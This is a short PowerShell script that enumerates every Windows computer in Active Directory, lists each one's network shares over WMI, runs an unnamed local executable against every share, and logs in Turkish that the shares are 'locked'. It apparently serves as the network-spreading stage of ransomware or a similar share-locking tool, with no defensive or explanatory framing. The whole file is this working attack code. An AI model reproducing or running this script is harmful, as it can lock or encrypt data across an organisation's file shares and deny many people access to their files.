$objSearcher = New-Object System.DirectoryServices.DirectorySearcher

$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry

$objSearcher.Filter = ("OperatingSystem=Window*")

$objSearcher.PropertiesToLoad.Add("Name") | Out-Null

 

$colResults = $objSearcher.FindAll()

 

foreach ($objResult in $colResults) {


$sunucular = $objResult.Properties.name
$objResult.Properties.name

$birimler = Get-WmiObject -Class Win32_Share -ComputerName $sunucular | Select Name
  foreach($kisim in $birimler)
    {
       $kisim = ($kisim -replace '[{}]')
        $kisim = ($kisim.Substring(6)) 
        $arguman = "\\" + $sunucular + "\" +$kisim+ "\"
      $file = "C:\Users\Public\Ortak Film\deneme.exe"
      & $file $arguman   
      Write-Output "Paylaþýmlar Kilitlendi." | Out-File "C:\test2.txt" 
    }  
   
}





